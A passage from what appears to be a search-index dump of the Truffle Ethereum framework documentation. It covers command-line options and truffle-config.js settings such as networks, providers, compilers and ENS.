Truffle Box ) \\<urlToGitRepo> - like https://github.com/truffle-box/bare-box \\<sshUrlToGitRepo> - like git@github.com:truffle-box/bare-box Also note that you can add a # followed by a branch name to the end of all of the above formats to unbox from a specific branch - for example, you could use truffle-box/bare-box#myBranch version \u00b6 Show version number and exit. truffle version watch \u00b6 Watch filesystem for changes and rebuild the project automatically. truffle watch This command will initiate a watch for changes to contracts, application, and configuration files. When there's a change, it will rebuild the app as necessary. Alert : This command is deprecated. Please use external tools to watch for filesystem changes and rerun tests.", "title": "Command line options"}, {"location": "docs/truffle/reference/command-line-options/#command-line-options", "text": "This section will describe every command available in the Truffle application.", "title": "Command line options"}, {"location": "docs/truffle/reference/command-line-options/#usage", "text": "All commands are in the following form: truffle <command> [ options ] Passing no arguments is equivalent to truffle help , which will display a list of all commands and then exit.", "title": "Usage"}, {"location": "docs/truffle/reference/command-line-options/#available-commands", "text": "", "title": "Available commands"}, {"location": "docs/truffle/reference/command-line-options/#build", "text": "Execute build pipeline (if configuration present). truffle build Requires the build key to be present in the configuration. See the Build processes sections for more details. Warning : The build command and this approach is being deprecated. Please use third-party build tools like webpack or grunt, or see our Truffle Boxes for an example.", "title": "build"}, {"location": "docs/truffle/reference/command-line-options/#compile", "text": "Compile contract source files. truffle compile [ --list <filter> ] [ --all ] [ --network <name> ] [ --quiet ] This will only compile contracts that have changed since the last compile, unless otherwise specified. Options: --list <filter> : List all recent stable releases from solc-bin. If filter is specified then it will display only that type of release or docker tags. The filter parameter must be one of the following: pre-releases, releases, latestRelease or docker. --all : Compile all contracts instead of only the contracts changed since last compile. --network <name> : Specify the network to use, saving artifacts specific to that network. Network name must exist in the configuration. --quiet : Suppress all compilation output.", "title": "compile"}, {"location": "docs/truffle/reference/command-line-options/#config", "text": "Displays and sets user-level configuration options. truffle config [ --enable-analytics | --disable-analytics ] [[ <get | set> <key> ] [ <list> ] [ <value-for-set> ]] Options: --enable-analytics|--disable-analytics : Enable or disable analytics. get : Get a Truffle configuration option value. set : Set a Truffle configuration option value. list : List all Truffle configuration option values.", "title": "config"}, {"location": "docs/truffle/reference/command-line-options/#console", "text": "Run a console with contract abstractions and commands available. truffle console [ --network <name> | --url <url endpoint> ] [ --verbose-rpc ] Spawns an interface to interact with contracts via the command line. Additionally, many Truffle commands are available within the console (without the truffle prefix). Requires an external Ethereum client, such as Ganache or geth. For a console that creates a development and test environment, use truffle develop . See the Using Truffle Develop and the Console section for more details. Options: --network <name> : Specify the network to use. Network name must exist in the configuration. --url <url endpoint> : Specify the Ethereum client endpoint to connect to. --verbose-rpc : Log communication between Truffle and the Ethereum client.", "title": "console"}, {"location": "docs/truffle/reference/command-line-options/#create", "text": "Helper to create new contracts, migrations and tests. truffle create <artifact_type> <ArtifactName> Options: <artifact_type> : Create a new artifact, where artifact_type is one of the following: contract , migration , test , or all . The new artifact is created along with one of the following files: contracts/ArtifactName.sol , migrations/####_artifact_name.js or tests/artifact_name.js . Using truffle create all will create all three. (required) <ArtifactName> : Name of new artifact. (required) Camel case names of artifacts will be converted to underscore-separated file names for the migrations and tests. Number prefixes for migrations are automatically generated.", "title": "create"}, {"location": "docs/truffle/reference/command-line-options/#dashboard", "text": "Start and open an instance of the Truffle dashboard. truffle dashboard [ --port <number> ] [ --host <string> ] [ --verbose ] Options: --port <number> : Port to start the Truffle dashboard on (default 24012 ). --host <string> : Host to start the Truffle dashboard on (default localhost ). --verbose : Start the Truffle dashboard with additional verbose logging (default false ) It is also possible to specify these options in the truffle-config.js file under \"dashboard\" . For example: module . exports = { // ... rest of truffle config dashboard : { port : 25012 , host : \"localhost\" , verbose : true } } When specifying options in the config file and in the CLI, the options provided in the CLI take precedence.", "title": "dashboard"}, {"location": "docs/truffle/reference/command-line-options/#debug", "text": "Interactively debug any transaction on the blockchain. truffle debug [ <transaction_hash> ] [ --network <network> | --url <provider_url> ] [ --fetch-external ] [ --compile-tests | --compile-all | --compile-none ] Will start an interactive debugging session on a particular transaction. Allows you to step through each action and replay. See Using the truffle debugger for more details. Options: <transaction_hash> : Transaction ID to use for debugging. You can omit this to simply start the debugger and then load a transaction later. --network : The network to connect to. --url : Allows you to specify a provider URL to connect to, in place of --network . If this option is used, the debugger may be used outside of a Truffle project. --fetch-external : Allows the debugger to download source from source verification services to debug transactions involving external contracts. When used, a transaction hash is required. May be abbreviated -x . --compile-tests : Allows the debugger to compile Solidity test contracts . Implies --compile-all . --compile-all : Forces the debugger to recompile all contracts, even when it would otherwise judge doing so unnecessary. Compilation results are not saved. --compile-none : Forces the debugger not to recompile contracts, even when it would otherwise judge it necessary. This option is dangerous and may cause errors. Please only use this if you are sure a recompilation is not necessary.", "title": "debug"}, {"location": "docs/truffle/reference/command-line-options/#deploy", "text": "Alias for migrate . See migrate for details.", "title": "deploy"}, {"location": "docs/truffle/reference/command-line-options/#develop", "text": "Open a console with a development blockchain truffle develop [ --log ] Spawns a local development blockchain, and allows you to interact with contracts via the command line. Additionally, many Truffle commands are available within the console (without the truffle prefix). If you want an interactive console but want to use an existing blockchain, use truffle console . See the Using the console section for more details. Option: --log : Start/Connect to a Truffle develop session and log all RPC activity. See the Log RPC Activity docs for more information about using this option.", "title": "develop"}, {"location": "docs/truffle/reference/command-line-options/#exec", "text": "Execute a JS module within the Truffle environment. truffle exec <script.js> [ --network <name> ] [ --compile ] This will include web3 , set the default provider based on the network specified (if any), and include your contracts as global objects while executing the script. Your script must export a function that Truffle can run. See the Writing external scripts section for more details. Options: <script.js> : JavaScript file to be executed. Can include path information if the script does not exist in the current directory. (required) --network <name> : Specify the network to use, using artifacts specific to that network. Network name must exist in the configuration. --compile : Compile contracts before executing the script.", "title": "exec"}, {"location": "docs/truffle/reference/command-line-options/#help", "text": "Display a list of all commands or information about a specific command. truffle help [ <command> ] Option: <command> : Display usage information about the specified command.", "title": "help"}, {"location": "docs/truffle/reference/command-line-options/#init", "text": "Initialize new and empty Ethereum project truffle init [ --force ] Creates a new and empty Truffle project within the current working directory. Alert : Older versions of Truffle used `truffle init bare` to create an empty project. This usage has been deprecated. Those looking for the MetaCoin example that used to be available through `truffle init` should use `truffle unbox MetaCoin` instead. Option: --force : Initialize project regardless of the current working directory's state. Be careful, this could overwrite existing files that have name conflicts.", "title": "init"}, {"location": "docs/truffle/reference/command-line-options/#install", "text": "Install a package from the Ethereum Package Registry. truffle install <package_name> [ @<version> ] Options: <package_name> : Name of the package as listed in the Ethereum Package Registry. (required) @<version> : When specified, will install a specific version of the package, otherwise will install the latest version.", "title": "install"}, {"location": "docs/truffle/reference/command-line-options/#migrate", "text": "Run migrations to deploy contracts. truffle migrate [ --reset ] [ --f <number> ] [ --to <number> ] [ --network <name> ] [ --compile-all ] [ --verbose-rpc ] [ --dry-run ] [ --interactive ] [ --skip-dry-run ] [ --describe-json ] Unless specified, this will run from the last completed migration. See the Migrations section for more details. Options: --reset : Run all migrations from the beginning, instead of running from the last completed migration. --f <number> : Run contracts from a specific migration. The number refers to the prefix of the migration file. --to <number> : Run contracts to a specific migration. The number refers to the prefix of the migration file. --network <name> : Specify the network to use, saving artifacts specific to that network. Network name must exist in the configuration. --compile-all : Compile all contracts instead of intelligently choosing which contracts need to be compiled. --verbose-rpc : Log communication between Truffle and the Ethereum client. --dry-run : Fork the network specified and only perform a test migration. --skip-dry-run : Skip the test migration performed before the real migration. --interactive : Prompt to confirm that the user wants to proceed after the dry run. --describe-json : Prints additional status messages.", "title": "migrate"}, {"location": "docs/truffle/reference/command-line-options/#networks", "text": "Show addresses for deployed contracts on each network. truffle networks [ --clean ] Use this command before publishing your package to see if there are any extraneous network artifacts you don't want published. With no options specified, this package will simply output the current artifact state. Option: --clean : Remove all network artifacts that aren't associated with a named network.", "title": "networks"}, {"location": "docs/truffle/reference/command-line-options/#obtain", "text": "Fetch and cache a specified compiler. truffle obtain [ --solc <version> ] Option: --solc : Download and cache a version of the solc compiler. (required)", "title": "obtain"}, {"location": "docs/truffle/reference/command-line-options/#opcode", "text": "Print the compiled opcodes for a given contract. truffle opcode <contract_name> Option: <contract_name> : Name of the contract to print opcodes for. Must be a contract name, not a file name. (required)", "title": "opcode"}, {"location": "docs/truffle/reference/command-line-options/#preserve", "text": "Preserve files and content to decentralized storage platforms such as IPFS or Filecoin. truffle preserve <path> --<recipe> [ --environment <name> ] Options: --ipfs : Preserve files to IPFS --filecoin : Preserve files to Filecoin --buckets : Preserve files to Textile Buckets --<recipe> : Preserve files using an installed plugin with the specified recipe tag --environment <name> : Specify the environment to use (defined in truffle-config.js ) (default: \"development\") Custom options for these \"preserve recipes\" can be provided through environments . Additional preserve recipes can be installed through NPM and configured as Truffle plugins . More information about usage, configuration and installation of preserve recipes can be found on the dedicated documentation page .", "title": "preserve"}, {"location": "docs/truffle/reference/command-line-options/#publish", "text": "Publish a package to the Ethereum Package Registry. truffle publish All parameters are pulled from your project's configuration file. Takes no arguments.", "title": "publish"}, {"location": "docs/truffle/reference/command-line-options/#run", "text": "Note : This feature is new and still in a barebones state. Please let us know how we can improve it! Run a third-party plugin command truffle run <command> Option: <command> : Name of a command defined by an installed plugin. (required) Install plugins as NPM package dependencies and configure Truffle to recognize the plugin. For more information, see Third-Party Plugin Commands .", "title": "run"}, {"location": "docs/truffle/reference/command-line-options/#test", "text": "Run JavaScript and Solidity tests. truffle test [ <test_file> ] [ --compile-all [ -debug ]] [ --network <name> ] [ --verbose-rpc ] [ --show-events ] [ --debug ] [ --debug-global <identifier> ] [ --bail ] [ --stacktrace [ -extra ]] Runs some or all tests within the test/ directory as specified. See the section on Testing your contracts for more information. Options: <test_file> : Name of the test file to be run. Can include path information if the file does not exist in the current directory. --compile-all : Compile all contracts instead of intelligently choosing which contracts need to be compiled. --compile-all-debug : Like --compile-all , but compiles contracts in debug mode for extra information. Has no effect on Solidity <0.6.3. --network <name> : Specify the network to use, using artifacts specific to that network. Network name must exist in the configuration. --verbose-rpc : Log communication between Truffle and the Ethereum client. --show-events : Log all contract events. --debug : Provides global debug() function for in-test debugging. Usable with Javascript tests only; implies --compile-all . --debug-global <identifier> : Allows one to rename the debug() function to something else. --bail : Bail after the first test failure. May be abbreviated -b . --stacktrace : Allows for mixed Javascript-and-Solidity stacktraces when a Truffle Contract transaction or deployment reverts. Does not apply to calls or gas estimates. Implies --compile-all . May be abbreviated -t . Warning: This option is still somewhat experimental. --stacktrace-extra : Shortcut for --stacktrace --compile-all-debug .", "title": "test"}, {"location": "docs/truffle/reference/command-line-options/#unbox", "text": "Download a Truffle Box, a pre-built Truffle project. truffle unbox <box_name> [ <destination_path> ] [ --force ] Downloads a Truffle Box to destination_path if provided. Truffle defaults to the current working directory if this argument is not provided. See the list of available Truffle boxes . You can also design and create your own boxes! See the section on Truffle boxes for more information. Options: <box_name> : Name of the Truffle Box. (required) --force : Unbox project in the current directory regardless of its state. Be careful, this will potentially overwrite files that exist in the directory. Note : box_name can be one of several formats: \\<truffleBoxName> - like metacoin (see the official Truffle boxes here ) \\<gitOrgName/repoName> - like truffle-box/bare-box (your repo will have to have the proper structure - see our page on creating a Truffle Box ) \\<urlToGitRepo> - like https://github.com/truffle-box/bare-box \\<sshUrlToGitRepo> - like git@github.com:truffle-box/bare-box Also note that you can add a # followed by a branch name to the end of all of the above formats to unbox from a specific branch - for example, you could use truffle-box/bare-box#myBranch", "title": "unbox"}, {"location": "docs/truffle/reference/command-line-options/#version", "text": "Show version number and exit. truffle version", "title": "version"}, {"location": "docs/truffle/reference/command-line-options/#watch", "text": "Watch filesystem for changes and rebuild the project automatically. truffle watch This command will initiate a watch for changes to contracts, application, and configuration files. When there's a change, it will rebuild the app as necessary. Alert : This command is deprecated. Please use external tools to watch for filesystem changes and rerun tests.", "title": "watch"}, {"location": "docs/truffle/reference/configuration/", "text": "Configuration \u00b6 Location \u00b6 Your configuration file is called truffle-config.js and is located at the root of your project directory. This file is a Javascript file and can execute any code necessary to create your configuration. It must export an object representing your project configuration like the example below. module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" // Match any network id } }, compilers : { solc : { version : \"^0.8.0\" } } }; Be sure to check out the truffle-config.js contained by the barebones project that truffle init creates. The truffle-config.js contains a handful of commented out examples of some configuration options that you might specify/tweak. Resolving naming conflicts on Windows \u00b6 Note : This only applies to Truffle version 4 and below. When using the Command Prompt on Windows, the default configuration file name can cause a conflict with the truffle executable, and so you may not be able to run Truffle commands properly on existing projects . This is because of the way that command precedence works on the Command Prompt. The truffle.cmd executable is on the path as part of the npm package, but the truffle.js configuration file is in the actual directory where the truffle command is run. Because .js is an acceptable executable extension by default, truffle.js takes precedence over truffle.cmd , causing unexpected results. Any of the following solutions will remedy this issue: Call the executable file explicitly using its .cmd extension ( truffle.cmd compile ) Edit the system PATHEXT environment variable and remove .JS; from the list of executable extensions Rename truffle.js to something else ( truffle-config.js ) Use Windows PowerShell or Git BASH , as these shells do not have this conflict. General options \u00b6 solidityLog \u00b6 Like JavaScript's console.log , you can utilize the same concept to print state of your contract during execution. This log will appear when you use truffle test or truffle develop . To use it, import truffle/console.sol into your Solidity contract and use it like you would in JavaScript. See the Nodejs' util.format() documentation for usage details. Here's how to import the truffle/console.sol contract. Expand the code block to see the full usage example. pragma solidity >= 0.4.25 < 0.9.0 ; import \"truffle/console.sol\" ; Example: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.25 < 0.9.0 ; import \"truffle/console.sol\" ; contract Telephone { uint public secret ; constructor ( uint _secret ) payable { console . log ( \"Telephone::constructor\\n\\tsecret: %o\" , _secret ); secret = _secret ; } function derivedSecret () public view returns ( uint256 ) { uint256 telephoneSecret = 100 * secret + 1 ; console . log ( \"The passphrase is: %o\" , secret ); console . log ( \"Leak it a hundred times, plus one: %o\" , telephoneSecret ); return telephoneSecret ; } } const Telephone = artifacts . require ( \"Telephone\" ); const getRnd = function () { const [ min , max ] = [ 13 , 1013 ]; return Math . floor ( Math . random () * ( max - min + 1 )) + min ; } contract ( \"Telephone\" , function ( /* accounts */ ) { let subject ; describe ( \"Works with new deployment\" , function () { let newSecret ; before ( async function () { newSecret = getRnd (); subject = await Telephone . new ( newSecret ); }); it ( \"Should have a deployed contract\" , async function () { return assert . isTrue ( subject !== undefined ); }); it ( \"has the secret\" , async function () { const secret = await subject . secret (); assert . strictEqual ( secret , newSecret ); }); it ( \"has the derived Secret\" , async function () { const derivedSecret = await subject . derivedSecret (); const expected = 100 * newSecret + 1 ; assert . strictEqual ( derivedSecret , expected ); }); }); }); displayPrefix \u00b6 You can set the displayPrefix string to decorate console.log 's output. This is useful when you want to differentiate console.log from verbose output in the terminal. For example: module . exports = { ... solidityLog : { displayPrefix : \" :\" } } Would produce the following truffle test output $ truffle test Compiling your contracts... =========================== > Compiling ./contracts/Telephone.sol > Artifacts written to /tmp/test--19090-s3Aobp6MBrr3 > Compiled successfully using: - solc: 0.8.17+commit.8df45f5f.Emscripten.clang Contract: Telephone Works with new deployment : Telephone::constructor : secret: 786n \u2714 Should have a deployed contract \u2714 has the secret : The passphrase is: 786n : Leak it a hundred times, plus one: 78601n \u2714 has the derived Secret 3 passing (161ms) preventConsoleLogMigration \u00b6 Because it's hard to exactly reason about gas usage when a truffle/console.sol is deployed to mainnet, you can opt in to guarding your project. When solidityLog.preventConsoleLogMigration is true, truffle migrate will stop migration on mainnet. module . exports = { ... solidityLog : { preventConsoleLogMigration : true // default is false, } } build \u00b6 Build configuration of your application, if your application requires tight integration with Truffle. Most users likely will not need to configure this option. See the Build Processes section for more details. networks \u00b6 Specifies which networks are available for deployment during migrations, as well as specific transaction parameters when interacting with each network (such as gas price, from address, etc.). When compiling and running migrations on a specific network, contract artifacts will be saved and recorded for later use. When your contract abstractions detect that your Ethereum client is connected to a specific network, they'll use the contract artifacts associated with that network to simplify app deployment. Networks are identified through Ethereum's net_version RPC call, as well as blockchain URIs. The networks object, shown below, is keyed by network names and each name contains a corresponding object that defines the parameters of the network. You will most likely want to provide your own network names and configurations to tell Truffle what networks to connect to for deployments and testing. Once you have defined your networks, you can provide the names as an option for certain commands; this is possible during testing or running migrations. You might specify a network name during migrations as follows: $ truffle migrate --network live Note that if no --network option is provided when using commands that require a network, Truffle will by default look for a network named \"development\" in your truffle-config.js . It will then use those settings to try and connect. See the provided examples below for some guidance on defining your networks. Example: networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , // match any network websockets : true }, live : { host : \"178.25.19.88\" , // Random IP for example purposes (do not use) port : 80 , network_id : 1 , // Ethereum public network // optional config values: // gas - use gas and gasPrice if creating type 0 transactions // gasPrice - all gas values specified in wei // maxFeePerGas - use maxFeePerGas and maxPriorityFeePerGas if creating type 2 transactions (https://eips.ethereum.org/EIPS/eip-1559) // maxPriorityFeePerGas - // from - default address to use for any transaction Truffle makes during migrations // provider - web3 provider instance Truffle should use to talk to the Ethereum network. // - function that returns a web3 provider instance (see below.) // - if specified, host and port are ignored. // production: - set to true if you would like to force a dry run to be performed every time you migrate using this network (default: false) // - during migrations Truffle performs a dry-run if you are deploying to a 'known network' // skipDryRun: - set to true if you don't want to test run the migration locally before the actual migration (default: false) // confirmations: - number of confirmations to wait between deployments (default: 0) // timeoutBlocks: - if a transaction is not mined, keep waiting for this number of blocks (default: 50) // deploymentPollingInterval: - duration between checks for completion of deployment transactions // networkCheckTimeout: - amount of time for Truffle to wait for a response from the node when testing the provider (in milliseconds) // - increase this number if you have a slow internet connection to avoid connection errors (default: 5000) // disableConfirmationListener: - set to true to disable web3's confirmation listener } } For each network, if unspecified, transaction options will default to the following values: gas : Gas limit used for deploys. Default is 6721975 . gasPrice : Gas price used for deploys. Default is 20000000000 (20 Gwei). from : From address used during migrations. Defaults to the first available account provided by your Ethereum client. provider : Default web3 provider using host and port options: new Web3.providers.HttpProvider(\"https://<host>:<port>\") websockets : You will need this enabled to use the confirmations listener or to hear Events using .on or .once . Default is false . deploymentPollingInterval : When a smart contract is deployed, this determines how often to check whether the transaction has been completed, specified in milliseconds. Default is 4000 . Note that this is independent of the polling interval that provider may use. See @truffle/hdwallet-provider documentation if you are using HDWalletProvider and wish to specify a custom pollingInterval . Note that it is perfectly fine to set disableConfirmationListener while also setting a value for confirmations ; this will not cause hangs during deployment. For each network, you can specify host / port , url , or provider , but not more than one. If you need an HTTP provider, we recommend using host and port , or url , while if you need a custom provider such as HDWalletProvider , you must use provider . The url option also supports WebSockets and SSL. url should include the full url; see the examples below: http://127.0.0.1:8545 ws://127.0.0.1:8545 https://sandbox.truffleteams.com/yoursandboxid wss://sandbox.truffleteams.com/yoursandboxid Special (managed) networks: test and develop \u00b6 The networks test and develop are special, in that they can be used to specify the settings for the managed Ganache instance started by truffle test and truffle develop , respectively. These options are simply included like any other network options. The supported options are: network_id : The network ID to use. Defaults to 5777. total_accounts : The number of unlocked accounts Ganache should provide. Defaults to 10. Alias: accounts . default_balance_ether : The default amount of ether to seed unlocked accounts with, specified in ether. Defaults to 100 ether. Alias: defaultEtherBalance . blockTime : If specified, the number of seconds inbetween mining blocks (as opposed to automatically mining on each transaction sent). Defaults to 0 (i.e., automine). fork : If specified, the URL of a provider that Ganache should fork from. hardfork : Allows specifying the hardfork (EVM version) that Ganache should use. gasLimit : The block gas limit. Defaults to 6721975. gasPrice : The gas price, specified in wei. Defaults to 2000000000 wei. genesis_time : The genesis time. Alias: time . host : The hostname to listen on. Defaults to \"127.0.0.1\" . Only applies to truffle develop , not truffle test . port : The port to listen on. Defaults to 9545. Only applies to truffle develop , not truffle test . Note: In the case of truffle test , these options will only be applied if no host , port , url , or provider is set. If one of these is set, then the test network will not be treated specially and no managed instance of Ganache will be started; instead truffle test will attempt to connect to the specified provider. console \u00b6 Use this option to configure the console environment. This is the environment you get when using truffle console or truffle develop . require : Use this to specify a JavaScript module that will be loaded into the console environment at startup. Your module's default export must be an object with named keys. Each key will used as a variable name, assigned its value, and be available in the console environment. For example, if your JavaScript is module.exports = { myVariable: \"three doughnuts please!\" } then you will have the variable myVariable available in the console with the value \"three doughnuts please!\" . You may specify this option in several ways. 1. The value of require can be a string path to the target JavaScript file to be loaded. 2. An object with a path property that is a string path to the JavaScript to be loaded. 3. An object with a path property that is a string path to the JavaScript to be loaded as well as an as property that specifies the namespace where the variables loaded will be available. The following are examples of how you can set this property in your truffle-config.js . You can set console.require to be a string path. module . exports = { console : { require : \"./somePath.js\" } } You can alternatively set console.require to an array of objects where you specify a path property. Note the use of the optional property as when specifying the path \"../../someOtherPath.js\" . The values loaded from that module will be namespaced under myVariables in the console environment. In other words, you will access the loaded variables from that module like myVariables.<myVariableName> . module . exports = { console : { require : [ { path : \"./somePath.js\" }, { path : \"../../someOtherPath.js\" , as : \"myVariables\" } ] } } Providers \u00b6 The following network list consists of a local test network and an Infura-hosted Ropsten network, both provided by HDWalletProvider. Make sure you wrap @truffle/hdwallet-provider instances in a function closure as shown below to ensure that only one network is ever connected at a time. networks : { ropsten : { provider : function () { return new HDWalletProvider ( mnemonic , \"https://ropsten.infura.io/v3/YOUR-PROJECT-ID\" ); }, network_id : '3' , }, test : { provider : function () { return new HDWalletProvider ( mnemonic , \"http://127.0.0.1:8545/\" ); }, network_id : '*' , }, } If you specify host and port instead of provider , Truffle will create its own default HTTP provider using that host and port, and no minimal network connection will be opened, so there is no need to do the function wrapping workaround. That said, you wouldn't be able to use a custom provider in this case. contracts_directory \u00b6 The default directory for uncompiled contracts is ./contracts relative to the project root. If you wish to keep your contracts in a different directory you may specify a contracts_directory property. Example: To have Truffle find contracts in ./allMyStuff/someStuff/theContractFolder (recursively) at compile time: module . exports = { contracts_directory : \"./allMyStuff/someStuff/theContractFolder\" , networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , } } }; Note : In addition to specifying a relative path, you can also use globs/regular expressions to selectively compile contracts. contracts_build_directory \u00b6 The default output directory for compiled contracts is ./build/contracts relative to the project root. This can be changed with the contracts_build_directory key. Examples: To place the built contract artifacts in ./output/contracts : module . exports = { contracts_build_directory : \"./output\" , networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , } } }; The built contract artifacts do not need to be inside the project root: module . exports = { contracts_build_directory : \"../../../output\" , networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , } } }; Absolute paths will also work. This is not recommended though, as an absolute path may not exist when compiled on another system. If you use absolute paths on Windows, make sure to use double backslashes for paths (example: C:\\\\Users\\\\Username\\\\output ). migrations_directory \u00b6 The default migrations directory is ./migrations relative to the project root. This can be changed with the migrations_directory key. Example: module . exports = { migrations_directory : \"./allMyStuff/someStuff/theMigrationsFolder\" , networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , } } }; dashboard \u00b6 Configuration options for the Truffle Dashboard . These options will be used when running truffle dashboard inside the project directory and these details will be used for the built in \"dashboard\" network. Example: module . exports = { dashboard : { port : 24012 , host : \"localhost\" , verbose : false , } }; mocha \u00b6 Configuration options for the MochaJS testing framework. This configuration expects an object as detailed in Mocha's documentation . Example: mocha : { useColors : true } etherscan \u00b6 Configuration options that Truffle will use when attempting to download source code from Etherscan . Has one suboption: apiKey : The API key to use when retrieving source code from Etherscan. If omitted, source will be retrieved without an API key, which may be slower. Example: etherscan : { apiKey : \"0123456789abcdef0123456789abcdef\" //replace this with your API key if you have one } sourceFetchers \u00b6 A list of verified source repositories that Truffle may attempt to download source code from, in the order it should attempt to use them. Currently the supported repositories are \"etherscan\" (for Etherscan ) and \"sourcify\" (for Sourcify ). The default is [\"etherscan\", \"sourcify\"] , i.e., to check Etherscan first, then Sourcify. Example: sourceFetchers : [ \"sourcify\" , \"etherscan\" ] //prefer Sourcify over Etherscan Compiler configuration \u00b6 In the compilers object you can specify settings related to the compilers used by Truffle. solc \u00b6 Solidity compiler settings. Supports optimizer settings for solc , as well as other settings such as debug and metadata settings. You may specify... + any solc-js version (using semver) listed at solc-bin . Specify the one you want and Truffle will get it for you. + \"native\" to use a natively compiled solc binary (you'll need to install this yourself, links to help below). + a dockerized solc tag from one of images published here . + a path to a locally available solc + \"pragma\" to have Truffle autodetect solc versions from your source files. This can be used to compile using multiple versions of solc. + a solc-js parser for faster docker and native compilations Truffle config example: module . exports = { compilers : { solc : { version : < string > , // A version or constraint - Ex. \"^0.5.0\" // Can be set to \"native\" to use a native solc or // \"pragma\" which attempts to autodetect compiler versions docker : < boolean > , // Use a version obtained through docker parser : \"solcjs\" , // Leverages solc-js purely for speedy parsing settings : { optimizer : { enabled : < boolean > , runs : < number > // Optimize for how many times you intend to run the code }, evmVersion : < string > // Default: \"istanbul\" }, modelCheckerSettings : { // contains options for SMTChecker } } } } For more information, please see the Solidity documentation on Compiler Input JSON Description for the various possible settings. Note that customizing stopAfter and outputSelection are not currently supported. vyper \u00b6 Vyper compiler settings. Similar to the solc settings, but not as extensive. In particular, specifying a Vyper version is not currently supported; your local Vyper installation will always be used. Truffle config example: module . exports = { compilers : { vyper : { settings : { evmVersion : < string > , optimize : < boolean > //defaults to true } } } } Currently, only changing the settings is supported for Vyper; see the Vyper documentation on Compiler Input JSON Description for the possible settings. Note that customizing outputSelection is not supported. external compilers \u00b6 For more advanced use cases with artifact creation you can use the external compilers configuration. You can use this feature by adding a compilers.external object to your Truffle config: module . exports = { compilers : { external : { command : \"./compile-contracts\" , targets : [{ /* compilation output */ }] } } } When you run truffle compile, Truffle will run the configured command and look for contract artifacts specified by targets. This new configuration supports a couple of main use cases: Your compilation command outputs Truffle JSON artifacts directly. If your compilation command generates artifacts directly, or generates output that contains all the information for an artifact, configure a target as follows: module . exports = { compilers : { external : { command : \"./compile-contracts\" , targets : [{ path : \"./path/to/artifacts/*.json\" }] } } } Truffle will execute your script, then expand the glob (*) and find all .json files in the listed path and copy those over as artifacts in the build/contracts/ directory. Your compilation command outputs individual parts of an artifact, and you want Truffle to generate the artifacts for you. The above use case might not be sufficient for all use cases. You can configure your target to run an arbitrary post-processing command: module . exports = { compilers : { external : { command : \"./compile-contracts\" , targets : [{ path : \"./path/to/preprocessed-artifacts/*.json\" , command : \"./process-artifact\" }] } } } This will run ./process-artifact for each matched .json file, piping the contents of that file as stdin. Your ./process-artifact command is then expected to output a complete Truffle artifact as stdout. Want to provide the path as a filename instead? Add stdin: false to your target configuration. You can also specify the individual properties of your contracts and have Truffle generate the artifacts itself. module . exports = { compilers : { external : { command : \"./compile-contracts\" , targets : [{ properties : { contractName : \"MyContract\" , /* other literal properties */ }, fileProperties : { abi : \"./output/contract.abi\" , bytecode : \"./output/contract.bytecode\" , /* other properties encoded in output files */ } }] } } } Specify properties and/or fileProperties , and Truffle will look for those values when building the artifacts. To override the working directory for all specified paths and running commands, use the workingDirectory option. For instance, the following will run ./proj/compile-contracts and read ./proj/output/contract.abi : module . exports = { compilers : { external : { command : \"./compile-contracts\" , workingDirectory : \"./proj\" , targets : [{ fileProperties : { abi : \"./output/contract.abi\" , bytecode : \"./output/contract.bytecode\" , } }] } } } plugins \u00b6 Note : This feature is new and still in a barebones state. Please let us know how we can improve it! Provides Truffle with a list of installed third-party extensions installed as NPM package dependencies. Truffle supports two separate kinds of plugins. The first are run plugins that define a custom workflow command. More information on these can be found under Third-Party Plugin Commands . The second type of plugins are preserve plugins that define a custom workflow for preserving content using the truffle preserve command. More information on these can be found under Preserving Files and Content to Storage Platforms . Environments \u00b6 Environments are a way to specify different configuration parameters depending on the selected environment. For example, connection to IPFS is often done with a local node or ganache, while in production, it makes sense to connect to Infura. This can be configured with environments. module . exports = { /* ... rest of truffle-config */ environments : { /* ... other environments */ development : { ipfs : { address : 'http://localhost:5001 } }, production: { ipfs: { address: ' https : //ipfs.infura.io:5001' } } } } ENS configuration \u00b6 Configuration for Truffle's Ethereum Name Service support can be done either globally or per-network. However, either way, it must be enabled globally to be used. module . exports = { /* ... rest of truffle-config */ ens : { enabled : true //turns on ENS support -- must be set to use ENS features! registry : { address : '0x0123456789012345678901234567890123456789' //allows specifying a custom registry address } }, networks : { /* ... other networks */ myNetwork : { /* ...rest of network config */ ens : { registry : { address : '0x9876543210987654321098765432109876543210' //specify a custom registry address for this network only } } } } } A registry address for a particular network will, for that network, override the global setting. Also, if you explicitly set the registry address to null for a particular network, this will turn off the custom registry address for that network (this is useful if, for instance, you want to use the deployer's development registry). A global registry address can alternately be set in config.ens.registryAddress instead of config.ens.registry.address ; please don't set both of these. Likewise, a registry address for a specific network can alternately be set in config.networks.<network_name>.registry.address or config.networks.<network_name>.registryAddress instead of config.networks.<network_name>.ens.registry.address ; again, please don't set more than one of these. EthPM configuration \u00b6 This configuration applies to the optional ethpm.json file that exists alongside your truffle.js configuration file. package_name \u00b6 Name of the package you're publishing. Your package name must be unique to the EthPM registry. Example: package_name : \"adder\" version \u00b6 Version of this package, using the semver specification. Example: version : \"0.0.3\" description \u00b6 A text description of your package for human readers. Example: description : \"Simple contract to add two numbers\" authors \u00b6 An array of authors. Can have any format, but we recommend the format below. Example: authors : [ \"Tim Coulter <tim.coulter@consensys.net>\" ] keywords \u00b6 An array of keywords that tag this package with helpful categories. Example: keywords : [ \"ethereum\" , \"addition\" ], dependencies \u00b6 A list of EthPM packages your package depends on, using semver version ranges, like npm. Example: dependencies : { \"owned\" : \"^0.0.1\" , \"erc20-token\" : \"1.0.0\" } license \u00b6 License to use for this package; primarily informative. Contracts created with truffle create will also include this in their SPDX-License-Identifier comment. Example: license : \"MIT\" ,", "title": "Configuration file options"}, {"location": "docs/truffle/reference/configuration/#configuration", "text": "", "title": "Configuration"}, {"location": "docs/truffle/reference/configuration/#location", "text": "Your configuration file is called truffle-config.js and is located at the root of your project directory. This file is a Javascript file and can execute any code necessary to create your configuration. It must export an object representing your project configuration like the example below. module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" // Match any network id } }, compilers : 